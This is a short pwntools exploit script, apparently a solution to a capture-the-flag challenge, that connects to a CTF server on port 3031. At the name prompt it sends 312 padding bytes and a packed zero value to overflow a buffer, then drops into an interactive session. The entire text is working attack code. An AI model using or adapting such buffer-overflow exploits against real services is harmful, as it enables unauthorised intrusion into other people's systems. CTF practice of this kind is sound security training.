from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3031)

context.log_level="debug"

payload = 'a' *  312 + p64(0)

p.sendlineafter('input name: ', payload)

p.interactive()
